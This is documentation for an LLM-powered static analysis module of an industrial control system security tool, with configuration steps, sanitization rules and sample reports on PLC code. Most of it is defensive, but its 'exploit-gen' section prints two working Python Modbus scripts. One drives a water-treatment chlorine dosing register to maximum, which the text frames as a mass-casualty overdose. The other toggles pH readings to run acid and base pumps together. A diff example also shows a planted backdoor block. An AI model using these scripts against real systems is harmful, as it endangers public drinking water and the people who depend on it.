# SAST / LLM Analysis

IXF includes an offline Static Application Security Testing (SAST) module powered by large language models. It analyzes PLC/RTU/SCADA source code for security vulnerabilities, unsafe setpoints, authentication gaps, hardcoded credentials, race conditions, and process-specific attack vectors — without unintentionally uploading sensitive code to external services (see sanitization section).

The SAST engine is designed specifically for industrial control system code, with domain-specific prompts that understand Ladder Diagram logic, Structured Text safety interlocks, Function Block Diagram dataflows, and IEC 61131-3 programming semantics.

---

## Supported LLM Providers

IXF supports 5 LLM providers for SAST analysis:

| Provider | Model | Env Variable | Auth Method | API URL |
|----------|-------|--------------|-------------|---------|
| OpenAI | `gpt-4o` | `OPENAI_API_KEY` | Bearer token (sk-...) | `https://api.openai.com/v1/chat/completions` |
| Anthropic | `claude-3-5-sonnet-20241022` | `ANTHROPIC_API_KEY` | x-api-key header (sk-ant-...) | `https://api.anthropic.com/v1/messages` |
| Google Gemini | `gemini-2.5-flash` | `GOOGLE_AI_STUDIO_API_KEY` | Query parameter key=... (AIzaSy...) | `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent` |
| DeepSeek | `deepseek-chat` | `DEEPSEEK_API_KEY` | Bearer token (sk-deepseek-...) | `https://api.deepseek.com/v1/chat/completions` |
| Grok (xAI) | `grok-2-latest` | `XAI_API_KEY` | Bearer token (xai-...) | `https://api.x.ai/v1/chat/completions` |

**Provider selection priority:** OpenAI → Anthropic → Gemini → DeepSeek → Grok

The first configured provider (in priority order) is selected. To use a non-default provider when multiple are configured, configure only that provider's API key.

---

## Configuring an LLM Key

### Option 1: Environment Variable (Recommended)

Set the environment variable before launching IXF. The key is read at startup and never written to disk by IXF itself.

```bash
# Google Gemini (free tier available)
export GOOGLE_AI_STUDIO_API_KEY=AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
ixf

# OpenAI
export OPENAI_API_KEY=sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789
ixf

# Anthropic
export ANTHROPIC_API_KEY=sk-ant-api03-XXXXXXXXXXXXXXXXXXX
ixf

# DeepSeek
export DEEPSEEK_API_KEY=sk-deepseek-XXXXXXXXXXXXXXXXXXXXXXXXXX
ixf

# Grok (xAI)
export XAI_API_KEY=xai-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
ixf
```

### Option 2: `llm-key` Shell Command (In-Session Only)

The `llm-key` command stores the key in memory only for the current session. The key is never written to disk, history, or logs.

```
ixf > llm-key gemini AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=gemini len=39
[i] Key stored in-session only. Set GOOGLE_AI_STUDIO_API_KEY to persist.

ixf > llm-key openai sk-svcacct-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789
[+] LLM key configured: provider=openai len=55

ixf > llm-key anthropic sk-ant-api03-XXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=anthropic len=40

ixf > llm-key deepseek sk-deepseek-XXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=deepseek len=37

ixf > llm-key grok xai-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=grok len=44
```

---

## `llm-status` Full Output

```
ixf > llm-status

  LLM Provider Status
  ──────────────────────────────────────────────────────────────────────────
  Provider      Status           Model                    Source
  openai        configured       gpt-4o                   OPENAI_API_KEY (env)
  anthropic     not configured   claude-3-5-sonnet-...    (set ANTHROPIC_API_KEY)
  gemini        configured       gemini-2.5-flash         GOOGLE_AI_STUDIO_API_KEY (env)
  deepseek      not configured   deepseek-chat            (set DEEPSEEK_API_KEY)
  grok          not configured   grok-2-latest            (set XAI_API_KEY)
  ──────────────────────────────────────────────────────────────────────────
  Active provider: openai (gpt-4o)   [selected by priority: openai > anthropic > gemini > deepseek > grok]

  [i] To use gemini instead, unset OPENAI_API_KEY or configure only gemini
  [i] Token budget: 128K tokens (applies to all providers)
  [i] Sanitization: ALWAYS applied before sending code to LLM
```

---

## Running SAST Analysis

```
ixf > sast <path> [--mode <mode>] [--diff <other_file>]
```

| Argument | Type | Required | Default | Description |
|----------|------|----------|---------|-------------|
| path | string | yes | — | PLC source file or project directory |
| `--mode` | string | no | `sast` | Analysis mode: `sast`, `reverse`, `diff`, `exploit-gen` |
| `--diff` | string | no | — | Second file/directory for `diff` mode |

---

## Supported File Extensions

| Extension | Language/Format | Common Usage |
|-----------|----------------|--------------|
| `.st` | Structured Text (IEC 61131-3) | Beckhoff TwinCAT, Siemens TIA Portal, CODESYS |
| `.fbd` | Function Block Diagram | CODESYS, Phoenix Contact, Rockwell |
| `.ladder` / `.ld` | Ladder Diagram | Rockwell Studio 5000, Allen-Bradley |
| `.il` | Instruction List (IEC 61131-3) | Legacy PLCs, Schneider Modicon |
| `.sfc` | Sequential Function Chart | Batch processes, machine sequences |
| `.cfc` | Continuous Function Chart | Siemens TIA Portal advanced |
| `.xml` | XML-exported PLC projects | CODESYS XML export, TwinCAT AML export |
| `.aml` | AutomationML | IEC 62424 plant topology |
| `.py` | Python | ICS automation scripts, OPC UA clients |
| `.c` | C | Embedded RTU firmware, Modbus handlers |
| `.cpp` | C++ | Embedded controllers, Beckhoff C++ runtime |
| `.go` | Go | Modern ICS tooling (FrostyGoop-style) |
| `.js` | JavaScript | Node-RED ICS flows, IIoT scripts |
| `.rb` | Ruby | Legacy ICS automation scripts |
| `.pl` | Perl | Legacy SCADA automation |
| `.java` | Java | Java-based HMI applications |

---

## Code Sanitization

Before any code is sent to the LLM, IXF applies a multi-pass sanitization pipeline. This prevents leaking sensitive operational data to cloud APIs.

**Sanitization is always applied — it cannot be disabled.**

### All 7 Sanitization Types

| Type | Pattern | Replacement | Example Before | Example After |
|------|---------|-------------|----------------|---------------|
| 1. IPv4 Addresses | `\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b` | `[IP_REDACTED]` | `192.168.1.100` | `[IP_REDACTED]` |
| 2. Passwords in strings | `password\s*[:=]\s*['"]?\w+` | `password: [REDACTED]` | `password = "Passw0rd!"` | `password: [REDACTED]` |
| 3. Usernames | `(user\|username)\s*[:=]\s*['"]?\w+` | `username: [REDACTED]` | `user = "admin"` | `username: [REDACTED]` |
| 4. Connection strings | `Server=.*;Database=.*` | `[CONN_STRING_REDACTED]` | `Server=10.1.1.5;Database=historian` | `[CONN_STRING_REDACTED]` |
| 5. API keys / tokens | `(api_key\|apikey\|token)\s*[:=]\s*\S+` | `api_key: [REDACTED]` | `api_key = "a1b2c3d4"` | `api_key: [REDACTED]` |
| 6. OPC UA endpoints | `opc\.tcp://[^\s'"]+` | `opc.tcp://[ENDPOINT_REDACTED]` | `opc.tcp://10.0.0.5:4840/UA/Server` | `opc.tcp://[ENDPOINT_REDACTED]` |
| 7. Hardcoded hashes | `[0-9a-fA-F]{32,}` | `[HASH_REDACTED]` | `MD5="d41d8cd98f00b204e9800998ecf8427e"` | `MD5=[HASH_REDACTED]` |

### Sanitization in Action

**Before sanitization (original file):**
```st
(* Water Treatment Controller v2.1 *)
PROGRAM WaterTreatment
  VAR
    historian_ip : STRING := '192.168.10.50';
    historian_user : STRING := 'admin';
    historian_pass : STRING := 'Sup3rS3cr3t!';
    opcua_endpoint : STRING := 'opc.tcp://10.0.1.5:4840/WINCC/ServerInterface';
    db_conn : STRING := 'Server=10.0.1.10;Database=historian;User=sa;Pwd=Admin123';
  END_VAR
```

**After sanitization (sent to LLM):**
```st
(* Water Treatment Controller v2.1 *)
PROGRAM WaterTreatment
  VAR
    historian_ip : STRING := '[IP_REDACTED]';
    historian_user : STRING := 'username: [REDACTED]';
    historian_pass : STRING := 'password: [REDACTED]';
    opcua_endpoint : STRING := 'opc.tcp://[ENDPOINT_REDACTED]';
    db_conn : STRING := '[CONN_STRING_REDACTED]';
  END_VAR
```

**Terminal confirmation:**
```
[*] Sanitizing code... Removed: 3 credential(s), 2 IP address(es), 1 OPC UA endpoint, 1 connection string
[*] Sending 4.2 KB to LLM (sanitized)...
```

---

## Token Budget

The SAST engine respects token limits to control cost and API compatibility:

| Provider | Max Tokens (Request) | Behavior on Exceed |
|----------|---------------------|-------------------|
| OpenAI (gpt-4o) | 128K | Warning + automatic truncation |
| Anthropic (claude-3-5-sonnet) | 200K | Warning + automatic truncation |
| Gemini (gemini-2.5-flash) | 1M | Warning only (very large context) |
| DeepSeek (deepseek-chat) | 64K | Warning + truncation |
| Grok (grok-2-latest) | 128K | Warning + truncation |

**Token budget warning:**
```
[!] Code size 145K tokens exceeds provider limit (128K for openai).
[!] Truncating to 128K tokens. Large files may receive incomplete analysis.
[i] Tip: Analyze individual files instead of the full directory.
[i] Or switch to gemini: llm-key gemini AIzaSy... (1M token limit)
```

**Token count output:**
```
[*] Token count: 9.7 KB ≈ 2,400 tokens (well within 128K budget)
```

---

## 8 Analysis Categories

SAST mode performs analysis across 8 security categories:

### Category 1: Setpoint Safety Validation

Checks for missing or insufficient validation on process setpoints (temperature, pressure, flow rate, chemical dosing). A missing validation allows an attacker writing to Modbus/OPC UA registers to set physically dangerous values.

**Example finding:**
```
FINDING [SEVERITY: CRITICAL]: Unvalidated Pressure Setpoint
  Location: compressor.st, line 34
  Code:     MAX_PRESSURE := MW100;  (* HR[50] written directly *)
  Issue:    No upper bound validation on MW100 (Modbus HR[50])
  Attack:   Modbus FC16 write to HR[50] with value 65535 → catastrophic overpressure
  Physical: Gas compressor runaway, explosion risk
  Fix:      MAX_PRESSURE := MIN(MW100, 150.0);  (* Max 150 PSI hardware safe limit *)
            IF MAX_PRESSURE > HARDWARE_SAFE_LIMIT THEN EMERGENCY_STOP := TRUE; END_IF
```

### Category 2: Authentication and Access Control

Checks for missing authentication on programming ports, unauthenticated SCADA endpoints, hardcoded credentials in code.

**Example finding:**
```
FINDING [SEVERITY: HIGH]: Programming Port Without Authentication
  Location: network_config.il, line 7
  Code:     LD PROGRAMMING_PORT_ENABLED
            ST TRUE  (* No authentication check *)
  Issue:    PLC programming interface enabled without requiring authentication
  Attack:   T0843 (Program Download) — any host can download modified PLC program
  Fix:      Add authentication check: IF ENGINEER_AUTHENTICATED THEN PROG_ENABLE := TRUE
```

### Category 3: Logic Race Conditions

Checks for timing-dependent logic that can lead to unsafe states. Common in ladder diagram programs with shared variables read across multiple scan cycles.

**Example finding:**
```
FINDING [SEVERITY: HIGH]: Race Condition in Chemical Dosing
  Location: chemical_dosing.st, lines 45-52
  Code:     (* Cycle 1: *) IF pH < 6.0 THEN ACID_PUMP := TRUE; END_IF
            (* Cycle 2: *) IF pH > 8.0 THEN BASE_PUMP := TRUE; END_IF
  Issue:    pH sensor read happens asynchronously between cycles.
            Both pumps can be TRUE simultaneously during rapid pH oscillation.
  Physical: pH < 2 or pH > 12 — severely corrosive water — infrastructure damage
  Fix:      Add mutex: IF ACID_PUMP THEN BASE_PUMP := FALSE; END_IF
            Or use atomic pH read with single decision point per scan
```

### Category 4: Missing Safety Interlocks

Checks for missing hardware/software interlocks that should prevent dangerous states. Often found when safety logic is commented out during maintenance and never restored.

**Example finding:**
```
FINDING [SEVERITY: CRITICAL]: Safety Interlock Disabled
  Location: reactor.st, line 88
  Code:     (* TEMP_INTERLOCK := TRUE; *)  (* TODO: re-enable after maintenance *)
            HEATER_ENABLE := TRUE;  (* Heater can run without temperature limit *)
  Issue:    Temperature interlock commented out — heater runs without safety limit
  Physical: Thermal runaway → reactor vessel overpressure → catastrophic failure
  Fix:      Restore: TEMP_INTERLOCK := (REACTOR_TEMP < MAX_SAFE_TEMP);
            HEATER_ENABLE := HEATER_REQUEST AND TEMP_INTERLOCK;
            Add CI check to prevent committed commented-out safety code
```

### Category 5: Hardcoded Credentials and Secrets

Identifies hardcoded passwords, API keys, connection strings, and authentication tokens in PLC code. (Reported in sanitized form — actual values not included in report.)

**Example finding:**
```
FINDING [SEVERITY: MEDIUM]: Hardcoded Database Credentials
  Location: historian_connector.st, line 12
  Code:     [CONN_STRING_REDACTED]  (* Original had hardcoded username and password *)
  Issue:    Database connection uses hardcoded credentials in PLC source code
  Risk:     Version control exposure; insider threat; supply chain compromise
  Fix:      Use credential vault (CyberArk, HashiCorp Vault, or environment variables)
            Implement certificate-based authentication for historian connection
```

### Category 6: Network Exposure and Protocol Security

Reviews network configuration code for insecure protocol usage, missing TLS, exposed management ports, unauthenticated remote access.

**Example finding:**
```
FINDING [SEVERITY: HIGH]: Unencrypted OPC UA Session
  Location: opcua_client.py, line 23
  Code:     client = Client("opc.tcp://[ENDPOINT_REDACTED]")
            client.set_security_policy(SecurityPolicyType.None_)  # No security
  Issue:    OPC UA session with SecurityMode=None — all data in plaintext
  Attack:   T0830 (Adversary-in-the-Middle) — intercept tag reads/writes
  Fix:      Use SecurityPolicy.Basic256Sha256 with certificate-based authentication:
            await client.set_security(
                SecurityPolicyType.Basic256Sha256,
                certificate_path, private_key_path
            )
```

### Category 7: Physical Process Impact Assessment

Analyzes the physical implications of identified vulnerabilities. Provides context on real-world consequences specific to the process type detected (power generation, water treatment, chemical processing, etc.).

**Example finding:**
```
FINDING [CONTEXT: CATASTROPHIC POTENTIAL]: Process Type — Water Treatment
  Location: water_treatment.st (full program analysis)
  Physical Process: Drinking water treatment for municipal supply
  Identified Attack Surface:
    - Chlorine dosing setpoint: unvalidated (CRITICAL — can cause lethal dosing)
    - pH neutralization: race condition (HIGH — corrosive water potential)
    - Turbidity monitoring: sensor bypass possible (MEDIUM — pathogen passage)
  Aggregate Physical Impact Assessment:
    Exploiting CRITICAL + HIGH findings together:
    → Lethally chlorinated water delivered to population (>2000x WHO limit)
    → pH excursion makes chlorine ineffective simultaneously
    → Mass casualty potential if delivered to distribution network
  MITRE: T0836, T0831, T0878, T0837 (Loss of Safety)
```

### Category 8: Code Quality and Maintainability Security

Identifies patterns that make security vulnerabilities more likely: dead code, TODO/FIXME comments related to security, magic numbers, missing comments on safety-critical blocks.

**Example finding:**
```
FINDING [SEVERITY: LOW]: Security-Relevant TODO Comment
  Location: safety_plc.st, line 156
  Code:     (* TODO: add auth check before EMERGENCY_OVERRIDE *)
            IF EMERGENCY_OVERRIDE THEN
              INHIBIT_ALL_ALARMS := TRUE;  (* Suppresses all safety alarms *)
              SAFETY_SIL2_BYPASS := TRUE;
            END_IF
  Issue:    Safety bypass without authentication check — acknowledged as missing in code
  Risk:     Any operator (or attacker) can trigger emergency override without MFA
  Fix:      Add authentication: IF EMERGENCY_OVERRIDE AND SUPERVISOR_AUTH THEN ...
```

---

## Analysis Modes — Complete Reference

### `--mode sast` (Default) — Full Vulnerability Analysis

```
ixf > sast /opt/plc_projects/water_treatment/ --mode sast
[*] Target: /opt/plc_projects/water_treatment/ (5 files, 245 lines)
[*] Languages: ST (3 files, 187 lines), FBD (1 file, 38 lines), IL (1 file, 20 lines)
[*] Provider: gemini (gemini-2.5-flash)
[*] Sanitizing... Removed: 2 credential(s), 1 public IP
[*] Token count: 9.7 KB ≈ 2,400 tokens
[*] Sending sanitized code to LLM...
[*] Analysis complete (elapsed: 8.2s)

  SAST VULNERABILITY ANALYSIS REPORT
  ═══════════════════════════════════════════════════════════════════════

  Target:   /opt/plc_projects/water_treatment/
  Files:    5 | Lines: 245
  Provider: gemini-2.5-flash
  Date:     2026-06-01 20:15:43

  ┌─────────────────────────────────────────────────────────────────────┐
  │  FINDINGS SUMMARY: 1 CRITICAL | 2 HIGH | 1 MEDIUM | 1 LOW | 1 INFO │
  └─────────────────────────────────────────────────────────────────────┘

  ════════════════════════════════════════════════════════════════════════
  FINDING 1 [SEVERITY: CRITICAL]
  ════════════════════════════════════════════════════════════════════════
  Title:        Unvalidated Chlorine Dosing Setpoint
  Location:     water_treatment.st, line 48
  Category:     Setpoint Safety Validation (Category 1)
  Type:         Input Validation Flaw / Unsafe Setpoint
  Code:
    SP_CHLORINE_HIGH := 4000.0;  (* TODO: validate this value *)
    DOSE_FACTOR := MW_DOSE_FACTOR;  (* HR[200] — no range check *)
  Attack Vector: Modbus FC16 write to HR[200] (DOSE_FACTOR) — no authentication required
  Physical Impact: Setting DOSE_FACTOR to max (65535) → ~4000 mg/L chlorine
                   WHO safe limit: 2.0 mg/L | Lethal threshold (infants): ~5 mg/L
                   CATASTROPHIC potential — mass casualty if distributed
  MITRE ATT&CK for ICS: T0836 (Modify Parameter), T0878 (Alarm Suppression)
  Exploit PoC:   modbus_write_register(unit=1, address=200, value=65535)
  Remediation:
    DOSE_FACTOR := MW_DOSE_FACTOR;
    IF DOSE_FACTOR > 2.0 THEN
      DOSE_FACTOR := 2.0;
      ALARM_SETPOINT_OVERRIDE := TRUE;
      LOG('DOSE_FACTOR clamped: attempted value ', MW_DOSE_FACTOR);
    END_IF
    (* Add hardware interlock: analog output ≤ 2.0 enforced in field instrument *)
  References:   WHO Water Quality Guidelines (2022); ICS-CERT Alert ICS-ALERT-21-209-01
  Residual Risk: Hardware interlock recommended even after software fix

  ════════════════════════════════════════════════════════════════════════
  FINDING 2 [SEVERITY: HIGH]
  ════════════════════════════════════════════════════════════════════════
  Title:        Race Condition in pH Dosing Logic
  Location:     water_treatment.st, lines 65-71
  Category:     Logic Race Condition (Category 3)
  Code:
    IF pH_SENSOR < 6.0 THEN ACID_PUMP := TRUE; END_IF
    IF pH_SENSOR > 8.0 THEN BASE_PUMP := TRUE; END_IF
  Issue:        pH sensor value can change between the two IF evaluations in a single
                scan cycle (interrupt-driven ADC update). Both pumps active simultaneously.
  Physical:     pH <2 or pH >12 — severely corrosive water
  MITRE:        T0831 (Manipulation of Control)
  Remediation:  Cache sensor at scan start; add mutual exclusion
    pH_CACHED := pH_SENSOR;
    IF pH_CACHED < 6.0 THEN ACID_PUMP := TRUE; BASE_PUMP := FALSE;
    ELSIF pH_CACHED > 8.0 THEN BASE_PUMP := TRUE; ACID_PUMP := FALSE;
    ELSE ACID_PUMP := FALSE; BASE_PUMP := FALSE;
    END_IF

  ════════════════════════════════════════════════════════════════════════
  FINDING 3 [SEVERITY: HIGH]
  ════════════════════════════════════════════════════════════════════════
  Title:        Unauthenticated PLC Programming Interface
  Location:     network_config.st, line 12
  Category:     Authentication and Access Control (Category 2)
  Code:         PROGRAMMING_PORT := 502; (* dev mode — auth not implemented *)
  Issue:        Any host on the OT network can download a modified PLC program
  MITRE:        T0843 (Program Download)
  Remediation:  Disable port in production; require engineering station certificate

  ════════════════════════════════════════════════════════════════════════
  FINDING 4 [SEVERITY: MEDIUM]
  ════════════════════════════════════════════════════════════════════════
  Title:        Hardcoded Database Credentials
  Location:     historian_connector.st, line 8
  Category:     Hardcoded Credentials (Category 5)
  Code:         [CONN_STRING_REDACTED] (sanitized — original contained credentials)
  Issue:        Historian connection string with hardcoded credentials
  Remediation:  Use vault or environment-based credential injection

  ════════════════════════════════════════════════════════════════════════
  FINDING 5 [SEVERITY: LOW]
  ════════════════════════════════════════════════════════════════════════
  Title:        Missing Watchdog Timer
  Location:     main.st (entire program)
  Category:     Missing Safety Interlocks (Category 4)
  Issue:        No watchdog timer configured — PLC could hang indefinitely
  Remediation:  WDT_Enable := TRUE; WDT_Timeout := 500; (* 500ms scan watchdog *)

  ════════════════════════════════════════════════════════════════════════
  FINDING 6 [INFO: Physical Process Context]
  ════════════════════════════════════════════════════════════════════════
  Title:        Process Type Identified — Municipal Water Treatment
  Assessment:   High-value target. All findings above have elevated real-world consequence
                compared to equivalent vulnerabilities in non-critical processes.
                Aggregate exploitation of CRITICAL + HIGH findings creates mass casualty potential.

  ═══════════════════════════════════════════════════════════════════════
  MITRE TECHNIQUES IDENTIFIED: T0836, T0831, T0843, T0878, T0837
  OVERALL RISK: CRITICAL
  ═══════════════════════════════════════════════════════════════════════

[+] SAST report saved: .tmp/sast_results/water_treatment_20260601_201543.md
```

---

### `--mode reverse` — Reverse Engineering Analysis

Analyzes binary or opaque compiled PLC firmware to extract logic, identify behavior patterns, and flag security concerns.

```
ixf > sast /opt/plc_dumps/plc_firmware_v3.2.bin --mode reverse
[*] Target: /opt/plc_dumps/plc_firmware_v3.2.bin (binary, 847 KB)
[*] Provider: gemini (gemini-2.5-flash)
[*] Mode: reverse — LLM-assisted binary/firmware analysis
[*] Extracting readable strings and structure markers...
[*] Sanitizing extracted content...
[*] Sending to LLM for reverse analysis...

  REVERSE ENGINEERING ANALYSIS REPORT
  ═══════════════════════════════════════════════════════════════

  Target:   plc_firmware_v3.2.bin (847 KB)
  Mode:     Reverse Engineering

  ─────────────────────────────────────────────────────────────
  IDENTIFIED SECTIONS:
  ─────────────────────────────────────────────────────────────
  Offset 0x0000-0x03FF : Boot header (VxWorks 6.9 signature)
  Offset 0x0400-0x1FFF : Configuration strings
  Offset 0x2000-0x8FFF : Runtime code (ARM Thumb-2 instructions)
  Offset 0x9000-0xFFFF : Data/constant section

  ─────────────────────────────────────────────────────────────
  EXTRACTED INDICATORS:
  ─────────────────────────────────────────────────────────────
  String match: "password" (offset 0x1A44) — potential hardcoded credential
  String match: "192.168.[IP_REDACTED]" (3 occurrences) — hardcoded IPs found
  String match: "ADMIN_OVERRIDE=1" — undocumented override flag
  String match: "DEBUG_MODBUS_PASSTHROUGH" — debug mode not removed from production FW
  Function name (symbol table): "auth_bypass_legacy()" — suspicious function name
  Modbus handler: FC16 write — no bounds checking on value range (assembly analysis)

  ─────────────────────────────────────────────────────────────
  SECURITY FINDINGS:
  ─────────────────────────────────────────────────────────────
  FINDING [SEVERITY: CRITICAL]: Undocumented Admin Override Flag
    Evidence: "ADMIN_OVERRIDE=1" in configuration section
    Risk: May allow unauthenticated administrative access
    Action: Request source code review from vendor; apply vendor patch

  FINDING [SEVERITY: HIGH]: Debug Mode Not Removed
    Evidence: "DEBUG_MODBUS_PASSTHROUGH" function present
    Risk: Debug Modbus passthrough may bypass authentication in production
    Action: Contact vendor for non-debug firmware build

  FINDING [SEVERITY: HIGH]: Suspicious Function: auth_bypass_legacy()
    Evidence: Symbol table entry; called from authentication handler
    Risk: Legacy authentication bypass potentially left in production code
    Action: Penetration test authentication flow; request source from vendor

  FINDING [SEVERITY: MEDIUM]: Hardcoded IP Addresses (3 occurrences)
    Evidence: IP addresses embedded in firmware (redacted in this report)
    Risk: Hardcoded IPs complicate network reconfiguration; may be C2 addresses
    Action: Compare with known legitimate management IPs; verify with vendor
```

---

### `--mode diff` — Code Change Detection

Compares two versions of PLC code to detect unauthorized modifications — a key use case for detecting supply chain attacks, insider threats, and Stuxnet/Triton-style targeted modifications.

```
ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
[*] Diff analysis: /backup/plc_v1.st vs /current/plc_v2.st
[*] Provider: gemini
[*] Computing structural diff...
[*] Sending diff + context to LLM...

  PLC CODE CHANGE SECURITY ANALYSIS
  ═══════════════════════════════════════════════════════════════

  File A (reference): /backup/plc_v1.st (saved: 2026-05-01)
  File B (current):   /current/plc_v2.st (modified: 2026-05-28)
  Total changes: 4 sections modified, 2 sections added, 0 deleted

  ─────────────────────────────────────────────────────────────
  CHANGE 1: AUTHORIZED — Routine maintenance
  ─────────────────────────────────────────────────────────────
  Location: Lines 12-15 (header comment)
  Change: Version comment updated from "v1.0" to "v1.1"
  Assessment: BENIGN — version tracking only

  ─────────────────────────────────────────────────────────────
  CHANGE 2: SUSPICIOUS — Requires investigation
  ─────────────────────────────────────────────────────────────
  Location: Lines 47-53 (safety interlock block)
  Version A (before):
    IF PRESSURE > MAX_PRESSURE THEN
      SAFETY_VALVE := TRUE;   (* Opens relief valve *)
      EMERGENCY_STOP := TRUE; (* Stops process *)
      ALARM := TRUE;          (* Alerts operator *)
    END_IF

  Version B (after — CURRENT):
    IF PRESSURE > MAX_PRESSURE THEN
      (* SAFETY_VALVE := TRUE; *)   (* — commented out 2026-05-28 *)
      FAKE_PRESSURE := 45.0;        (* spoofed to hide overpressure *)
      EMERGENCY_STOP := FALSE;      (* stop prevented *)
      ALARM := FALSE;               (* alarm silenced *)
    END_IF

  Assessment: [SEVERITY: CRITICAL] UNAUTHORIZED MODIFICATION DETECTED
  Analysis:   Safety valve disabled. Pressure reading spoofed to 45 PSI
              (hiding real overpressure). Emergency stop prevented.
              Alarm suppressed. Classic Triton/Industroyer2-style safety system bypass.
              Physical consequence: uncontrolled overpressure → catastrophic failure.
  MITRE:      T0838 (Modify Alarm Settings), T0836 (Modify Parameter),
              T0829 (Loss of Protection), T0837 (Loss of Safety)
  Action:     IMMEDIATE ROLLBACK to version A. Investigate access logs for 2026-05-28.
              Preserve evidence. Notify CISO and ICS-CERT if critical infrastructure.

  ─────────────────────────────────────────────────────────────
  CHANGE 3: UNAUTHORIZED — Command and control addition
  ─────────────────────────────────────────────────────────────
  Location: Lines 89-95 (new block added)
  Version A: (section did not exist)
  Version B:
    (* Maintenance backdoor — remove before production *)
    IF HIDDEN_TRIGGER = 0xDEAD THEN
      COIL_REMOTE_ENABLE := TRUE;  (* allows remote coil control *)
      MODBUS_AUTH_BYPASS := TRUE;  (* disables Modbus auth *)
    END_IF
  Assessment: [SEVERITY: CRITICAL] BACKDOOR DETECTED
  Analysis:   Magic value (0xDEAD) triggers remote control bypass.
              Comment "remove before production" was not removed — deliberate.
  MITRE:      T0859 (Valid Accounts bypass), T0836

  ─────────────────────────────────────────────────────────────
  CHANGE 4: BENIGN — Parameter update
  ─────────────────────────────────────────────────────────────
  Location: Lines 34-35
  Change: PUMP_SPEED_MAX from 3000 to 3100 RPM
  Assessment: Likely authorized maintenance change — verify with change log

  ─────────────────────────────────────────────────────────────
  OVERALL ASSESSMENT: CRITICAL — 2 unauthorized modifications detected
  ─────────────────────────────────────────────────────────────
  Action: Immediate rollback to /backup/plc_v1.st
          Preserve both files for forensic analysis
          Investigate access control to PLC programming station
          Report to CISO and consider ICS-CERT notification

[+] Diff report saved: .tmp/sast_results/plc_diff_20260601_202800.md
```

---

### `--mode exploit-gen` — Exploit Generation

Generates proof-of-concept exploit code based on SAST findings. For authorized penetration testing.

```
ixf > sast /opt/plc_projects/water_treatment/water_treatment.st --mode exploit-gen
[*] Analyzing for exploit generation potential...
[*] Provider: gemini
[*] Running SAST pass first...
[*] Generating PoC exploit for top findings...

  EXPLOIT GENERATION REPORT
  ═══════════════════════════════════════════════════════════════

  Source: water_treatment.st
  Findings used: CRITICAL (Chlorine Dosing Setpoint), HIGH (Race Condition)

  ════════════════════════════════════════════════════════════════
  EXPLOIT 1 — CRITICAL Finding: Chlorine Dosing Attack
  ════════════════════════════════════════════════════════════════

  Description: Writes maximum dosing value to HR[200] (DOSE_FACTOR) via unauthenticated
               Modbus TCP to cause catastrophic chlorine overdose
  Language:    Python (pymodbus)
  Impact:      CATASTROPHIC — mass casualty potential

  Generated PoC:
  ─────────────────────────────────────────────────────────────────
  #!/usr/bin/env python3
  """
  Water Treatment Chlorine Dosing PoC
  Finding: Unvalidated setpoint HR[200] (DOSE_FACTOR)
  MITRE: T0836 (Modify Parameter)
  AUTHORIZED PENETRATION TESTING ONLY
  """
  from pymodbus.client import ModbusTcpClient
  import sys

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
  PORT = 502
  UNIT_ID = 1
  DOSE_REGISTER = 200  # HR[200] = DOSE_FACTOR (maps to SP_CHLORINE_HIGH)
  ATTACK_VALUE = 65535  # Maximum register value → ~4000 mg/L

  print(f"[*] Connecting to {TARGET}:{PORT}...")
  client = ModbusTcpClient(TARGET, port=PORT)
  if not client.connect():
      print(f"[-] Connection failed")
      sys.exit(1)
  print(f"[+] Connected")

  # Read original value first (for restoration)
  original = client.read_holding_registers(DOSE_REGISTER, count=1, unit=UNIT_ID)
  if not original.isError():
      print(f"[i] Original DOSE_FACTOR: {original.registers[0]}")

  # Write attack value
  result = client.write_registers(DOSE_REGISTER, [ATTACK_VALUE], unit=UNIT_ID)
  if not result.isError():
      print(f"[+] DOSE_FACTOR set to {ATTACK_VALUE} on {TARGET}:{PORT}")
      print(f"[!] Estimated chlorine dose: ~{ATTACK_VALUE * 0.061:.1f} mg/L")
      print(f"[!] WHO limit: 2.0 mg/L | Lethal: ~5 mg/L for infants")
  else:
      print(f"[-] Write failed: {result}")

  # Restore original
  input("[*] Press Enter to restore original value (ALWAYS restore after testing)...")
  if not original.isError():
      client.write_registers(DOSE_REGISTER, [original.registers[0]], unit=UNIT_ID)
      print(f"[+] Original value restored: {original.registers[0]}")

  client.close()
  ─────────────────────────────────────────────────────────────────

  ════════════════════════════════════════════════════════════════
  EXPLOIT 2 — HIGH Finding: pH Race Condition Trigger
  ════════════════════════════════════════════════════════════════

  Description: Rapidly toggles pH sensor readings to trigger both acid and base pump
               simultaneously during race condition window
  Language:    Python (pymodbus)
  Impact:      HIGH — corrosive water production

  Generated PoC:
  ─────────────────────────────────────────────────────────────────
  #!/usr/bin/env python3
  """Rapid pH toggling to trigger race condition"""
  from pymodbus.client import ModbusTcpClient
  import time

  TARGET = "192.168.1.100"
  PORT = 502
  PH_REGISTER = 150  # HR[150] = pH sensor input register (analog input)

  client = ModbusTcpClient(TARGET, port=PORT)
  client.connect()

  print("[*] Starting pH toggle attack (race condition exploitation)...")
  for i in range(20):
      # Toggle between acid-triggering and base-triggering pH values
      # within a single PLC scan cycle timeframe
      client.write_registers(150, [500], unit=1)   # pH 5.0 → triggers ACID_PUMP
      time.sleep(0.005)                              # 5ms — within scan cycle
      client.write_registers(150, [850], unit=1)   # pH 8.5 → triggers BASE_PUMP
      time.sleep(0.005)
      print(f"[*] Iteration {i+1}/20 — both pumps may be active simultaneously")

  client.close()
  ─────────────────────────────────────────────────────────────────

  [!] All exploit PoCs are for authorized penetration testing only.
  [i] MITRE: T0836, T0831 | Physical Impact: CATASTROPHIC / HIGH
  [+] Exploit report saved: .tmp/sast_results/water_treatment_exploits_20260601.md
```

---

## Finding Format Template

